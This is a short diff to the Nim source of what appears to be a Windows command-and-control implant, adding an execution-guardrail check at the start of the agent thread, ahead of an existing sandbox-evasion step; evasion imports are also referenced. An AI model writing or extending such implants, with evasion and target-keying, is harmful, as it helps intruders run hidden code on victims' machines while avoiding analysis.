@@ -2,6 +2,7 @@ import winim/lean
 import agent
 import std/os
 import utils/strenc
+import utils/guardrails
 
 when defined(windows):
   # Evasion imports
@@ -24,6 +25,9 @@ when defined(windows):
   # Agent thread wrapper
   proc agentThreadProc(lpParameter: LPVOID): DWORD {.stdcall.} =
     try:
+      # Check execution guardrails before anything else
+      if not checkGuardrails():
+        return 0
       # Run sandbox evasion before anything else
       when defined(sandbox_evasion):
         runSandboxEvasion()
